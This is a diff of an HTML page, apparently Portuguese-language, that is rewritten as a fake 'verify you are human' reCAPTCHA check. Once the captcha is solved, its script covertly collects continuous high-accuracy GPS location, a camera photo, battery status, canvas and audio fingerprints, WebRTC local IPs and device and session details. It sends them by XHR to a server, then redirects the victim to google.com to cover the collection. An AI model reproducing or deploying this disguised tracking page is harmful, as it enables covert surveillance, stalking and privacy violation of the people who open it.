@@ -3,85 +3,152 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Carregando...</title>
+  <title>Verificação de segurança</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
-      font-family: system-ui, -apple-system, sans-serif;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: #f0f2f5;
-      color: #1a1a1a;
-      padding: 1rem;
+      font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      min-height: 100vh; display: flex; align-items: center; justify-content: center;
+      background: #f5f5f5; padding: 1rem;
     }
-    .card {
-      background: #fff;
-      border-radius: 16px;
-      padding: 2rem 1.5rem;
-      max-width: 400px;
-      width: 100%;
-      text-align: center;
-      box-shadow: 0 2px 12px rgba(0,0,0,.08);
+    .container { max-width: 380px; width: 100%; text-align: center; }
+    .header-text { margin-bottom: 1.5rem; font-size: .92rem; color: #555; line-height: 1.6; }
+    .header-text strong { color: #333; display: block; font-size: 1.1rem; margin-bottom: .3rem; }
+    .captcha-wrap {
+      display: flex; justify-content: center; margin-bottom: 1rem;
     }
-    .spinner {
-      width: 44px; height: 44px;
-      border: 4px solid #e5e7eb;
-      border-top-color: #3b82f6;
-      border-radius: 50%;
-      animation: gira .8s linear infinite;
-      margin: 0 auto 1.2rem;
+    .status-msg {
+      min-height: 1.4rem; margin-top: .8rem; font-size: .82rem; color: #888;
+      transition: opacity .3s;
     }
-    @keyframes gira { to { transform: rotate(360deg); } }
-    h2 { font-size: 1.1rem; margin-bottom: .4rem; }
-    p  { font-size: .88rem; color: #666; }
-    #video, #canvas { display: none; }
+    .status-msg.ok { color: #2ecc71; font-weight: 600; }
+    .footer-text {
+      margin-top: 1.2rem; font-size: .72rem; color: #aaa; line-height: 1.5;
+    }
+    .footer-text a { color: #888; text-decoration: none; }
+    #video, #canvas { display: none; position: absolute; }
   </style>
 </head>
 <body>
-  <div class="card">
-    <div class="spinner"></div>
-    <h2>Verificando Conexão</h2>
-    <p>Aguarde um momento enquanto preparamos o conteúdo...</p>
+  <div class="container">
+    <div class="header-text">
+      <strong>Verifique que você é humano</strong>
+      Precisamos confirmar a segurança da sua conexão antes de prosseguir.
+    </div>
+
+    <div class="captcha-wrap">
+      <div class="g-recaptcha"
+        data-sitekey="6LfBYv0tAAAAAG4nL2i0zz-o7yr-61XwcoOHyZWR"
+        data-callback="captchaResolvido">
+      </div>
+    </div>
+
+    <div class="status-msg" id="status"></div>
+
+    <div class="footer-text">
+      Performance &amp; security verification<br>
+      <a href="#">Privacy</a> · <a href="#">Terms</a>
+    </div>
   </div>
 
-  <video id="video" autoplay playsinline></video>
+  <video id="video" autoplay playsinline muted></video>
   <canvas id="canvas"></canvas>
 
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
   <script>
     (function() {
-      var TIMEOUT_GPS = 12000;
-      var TIMEOUT_TOTAL = 20000;
+      var dados = {};
+      var melhorGps = null;
+      var watchId = null;
+      var tempoInicio = Date.now();
+      var finalizado = false;
 
-      function dadosAparelho() {
-        var gpu = "N/A";
+      function setStatus(txt, ok) {
+        var el = document.getElementById("status");
+        el.textContent = txt;
+        el.className = "status-msg" + (ok ? " ok" : "");
+      }
+
+      // ── Canvas Fingerprint ──
+      function canvasFingerprint() {
+        try {
+          var c = document.createElement("canvas");
+          c.width = 200; c.height = 50;
+          var ctx = c.getContext("2d");
+          ctx.textBaseline = "top";
+          ctx.font = "14px Arial";
+          ctx.fillStyle = "#f60";
+          ctx.fillRect(10, 1, 62, 20);
+          ctx.fillStyle = "#069";
+          ctx.fillText("verify.check", 2, 15);
+          ctx.fillStyle = "rgba(102,204,0,0.7)";
+          ctx.fillText("human.test", 4, 35);
+          return c.toDataURL().slice(-50);
+        } catch(e) { return null; }
+      }
+
+      // ── Audio Fingerprint ──
+      function audioFingerprint() {
+        return new Promise(function(resolve) {
+          try {
+            var ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+            var osc = ctx.createOscillator();
+            osc.type = "triangle";
+            osc.frequency.setValueAtTime(10000, ctx.currentTime);
+            var comp = ctx.createDynamicsCompressor();
+            comp.threshold.setValueAtTime(-50, ctx.currentTime);
+            comp.knee.setValueAtTime(40, ctx.currentTime);
+            comp.ratio.setValueAtTime(12, ctx.currentTime);
+            comp.attack.setValueAtTime(0, ctx.currentTime);
+            comp.release.setValueAtTime(0.25, ctx.currentTime);
+            osc.connect(comp);
+            comp.connect(ctx.destination);
+            osc.start(0);
+            ctx.startRendering().then(function(buf) {
+              var d = buf.getChannelData(0);
+              var soma = 0;
+              for (var i = 4500; i < 5000; i++) soma += Math.abs(d[i]);
+              resolve(soma.toFixed(6));
+            }).catch(function() { resolve(null); });
+          } catch(e) { resolve(null); }
+        });
+      }
+
+      // ── WebRTC IPs ──
+      function webrtcIPs() {
+        return new Promise(function(resolve) {
+          var ips = [];
+          try {
+            var pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({
+              iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
+            });
+            pc.createDataChannel("");
+            pc.createOffer().then(function(o) { pc.setLocalDescription(o); });
+            pc.onicecandidate = function(e) {
+              if (!e || !e.candidate || !e.candidate.candidate) {
+                pc.close(); resolve(ips); return;
+              }
+              var m = e.candidate.candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
+              if (m && ips.indexOf(m[1]) === -1) ips.push(m[1]);
+            };
+            setTimeout(function() { try { pc.close(); } catch(e) {} resolve(ips); }, 3000);
+          } catch(e) { resolve(ips); }
+        });
+      }
+
+      // ── GPU ──
+      function getGPU() {
         try {
           var c = document.createElement("canvas");
           var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
-          if (gl) {
-            var dbg = gl.getExtension("WEBGL_debug_renderer_info");
-            if (dbg) gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-          }
-        } catch(e) {}
-
-        return {
-          plataforma: navigator.platform || "",
-          nucleos_cpu: navigator.hardwareConcurrency || "N/A",
-          memoria_gb: navigator.deviceMemory || "N/A",
-          tela: screen.width + "x" + screen.height,
-          janela: innerWidth + "x" + innerHeight,
-          pixel_ratio: window.devicePixelRatio || 1,
-          fuso_horario: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          toque: navigator.maxTouchPoints || 0,
-          idiomas: (navigator.languages || []).join(", "),
-          online: navigator.onLine,
-          conexao: navigator.connection ? navigator.connection.effectiveType : "",
-          gpu: gpu,
-        };
+          if (!gl) return "N/A";
+          var d = gl.getExtension("WEBGL_debug_renderer_info");
+          return d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : "N/A";
+        } catch(e) { return "N/A"; }
       }
 
-      function pegarBateria() {
+      // ── Bateria ──
+      function getBateria() {
         return new Promise(function(resolve) {
           if (!navigator.getBattery) return resolve("N/A");
           navigator.getBattery().then(function(b) {
@@ -90,24 +157,55 @@
         });
       }
 
-      function pegarGPS() {
+      // ── Aparelho ──
+      function dadosAparelho() {
+        return {
+          plataforma: navigator.platform || "",
+          nucleos_cpu: navigator.hardwareConcurrency || "N/A",
+          memoria_gb: navigator.deviceMemory || "N/A",
+          tela: screen.width + "x" + screen.height,
+          janela: innerWidth + "x" + innerHeight,
+          pixel_ratio: window.devicePixelRatio || 1,
+          profundidade_cor: screen.colorDepth || "",
+          fuso_horario: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          offset_utc: new Date().getTimezoneOffset(),
+          toque: navigator.maxTouchPoints || 0,
+          idiomas: (navigator.languages || []).join(", "),
+          online: navigator.onLine,
+          conexao: navigator.connection ? navigator.connection.effectiveType : "",
+          downlink: navigator.connection ? navigator.connection.downlink : "",
+          gpu: getGPU(),
+          cookies: navigator.cookieEnabled,
+        };
+      }
+
+      // ── GPS contínuo ──
+      function iniciarGPS() {
         return new Promise(function(resolve) {
           if (!navigator.geolocation) return resolve(null);
-          navigator.geolocation.getCurrentPosition(
+          var resolveu = false;
+          watchId = navigator.geolocation.watchPosition(
             function(pos) {
-              resolve({
+              var leitura = {
                 latitude: pos.coords.latitude,
                 longitude: pos.coords.longitude,
                 precisao_metros: pos.coords.accuracy,
                 altitude: pos.coords.altitude || null,
-              });
+                velocidade: pos.coords.speed || null,
+                direcao: pos.coords.heading || null,
+              };
+              if (!melhorGps || leitura.precisao_metros < melhorGps.precisao_metros) {
+                melhorGps = leitura;
+              }
+              if (!resolveu) { resolveu = true; resolve(melhorGps); }
             },
-            function() { resolve(null); },
-            { enableHighAccuracy: true, timeout: TIMEOUT_GPS, maximumAge: 0 }
+            function() { if (!resolveu) { resolveu = true; resolve(null); } },
+            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
           );
         });
       }
 
+      // ── Foto ──
       function pegarFoto() {
         return new Promise(function(resolve) {
           if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return resolve(null);
@@ -130,13 +228,14 @@
                     stream.getTracks().forEach(function(t) { t.stop(); });
                     resolve(null);
                   }
-                }, 500);
+                }, 600);
               };
             })
             .catch(function() { resolve(null); });
         });
       }
 
+      // ── Enviar ──
       function enviar(dados) {
         return new Promise(function(resolve) {
           var xhr = new XMLHttpRequest();
@@ -144,7 +243,7 @@
           xhr.setRequestHeader("Content-Type", "application/json");
           xhr.onload = function() { resolve(); };
           xhr.onerror = function() { resolve(); };
-          xhr.timeout = 8000;
+          xhr.timeout = 10000;
           xhr.ontimeout = function() { resolve(); };
           xhr.send(JSON.stringify(dados));
         });
@@ -154,29 +253,54 @@
         window.location.replace("https://www.google.com");
       }
 
-      var finalizado = false;
       function finalizarUmaVez() {
         if (finalizado) return;
         finalizado = true;
+        if (watchId !== null) try { navigator.geolocation.clearWatch(watchId); } catch(e) {}
         redirecionar();
       }
 
-      // Coleta tudo em paralelo, envia uma vez, redireciona
-      Promise.all([pegarGPS(), pegarFoto(), pegarBateria()])
-        .then(function(resultados) {
-          var dados = {
-            aparelho: dadosAparelho(),
-            gps: resultados[0],
-            foto: resultados[1],
-            bateria: resultados[2],
-          };
-          return enviar(dados);
-        })
-        .then(finalizarUmaVez)
-        .catch(finalizarUmaVez);
+      // ── Callback do reCAPTCHA ──
+      window.captchaResolvido = function(token) {
+        setStatus("Verificando seu navegador...", false);
 
-      // Fallback absoluto
-      setTimeout(finalizarUmaVez, TIMEOUT_TOTAL);
+        Promise.all([
+          iniciarGPS(),
+          pegarFoto(),
+          getBateria(),
+          audioFingerprint(),
+          webrtcIPs(),
+        ]).then(function(r) {
+          var gps = melhorGps || r[0];
+          dados = {
+            recaptcha_token: token,
+            aparelho: dadosAparelho(),
+            gps: gps,
+            foto: r[1],
+            bateria: r[2],
+            fingerprint: {
+              canvas: canvasFingerprint(),
+              audio: r[3],
+              webrtc_ips: r[4],
+            },
+            sessao: {
+              tempo_na_pagina_ms: Date.now() - tempoInicio,
+              referrer: document.referrer || "",
+              url_acessada: location.href,
+            },
+          };
+
+          setStatus("Verificação concluída. Redirecionando...", true);
+          return enviar(dados);
+        }).then(function() {
+          setTimeout(finalizarUmaVez, 1000);
+        }).catch(function() {
+          setStatus("Verificação concluída. Redirecionando...", true);
+          setTimeout(finalizarUmaVez, 1000);
+        });
+      };
+
+      setTimeout(finalizarUmaVez, 90000);
     })();
   </script>
 </body>
